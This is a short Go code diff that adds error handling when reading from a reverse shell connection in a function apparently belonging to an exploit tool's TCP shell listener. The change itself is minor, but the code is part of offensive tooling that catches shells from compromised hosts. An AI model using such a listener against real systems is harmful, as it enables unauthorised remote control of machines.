@@ -60,6 +60,10 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
   writer.WriteString("\r\n")
   writer.Flush()
 
+  _, readerr = reader.ReadString('>')
+  if readerr != nil {
+    fmt.Println("Error reading from reverse shell: " + readerr.Error())
+  }
   fmt.Println("Command launched")
 
   CloseConnectionLoudly(conn)
